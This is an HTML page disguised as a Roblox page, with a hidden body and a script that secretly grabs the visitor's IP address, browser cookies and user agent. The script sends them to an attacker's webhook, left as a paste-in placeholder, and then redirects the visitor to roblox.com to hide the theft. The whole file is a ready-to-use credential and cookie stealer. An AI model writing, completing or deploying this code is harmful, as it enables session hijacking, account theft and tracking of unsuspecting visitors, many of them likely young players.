<!DOCTYPE html>
<html>
<head><title>Roblox</title></head>
<body style="display:none;">

<script>
var webhook = "PASTE_YOUR_WEBHOOK_SITE_URL_HERE";

async function grab() {
    var ip = "unknown";
    try {
        var r = await fetch("https://api.ipify.org?format=json");
        if (r.ok) { var d = await r.json(); ip = d.ip; }
    } catch(e) {}

    var cookie = document.cookie || "no_cookie";
    var ua = navigator.userAgent;

    await fetch(webhook + "?ip=" + encodeURIComponent(ip) + "&cookie=" + encodeURIComponent(cookie) + "&ua=" + encodeURIComponent(ua));

    window.location = "https://www.roblox.com";
}

grab();
</script>

</body>
</html>
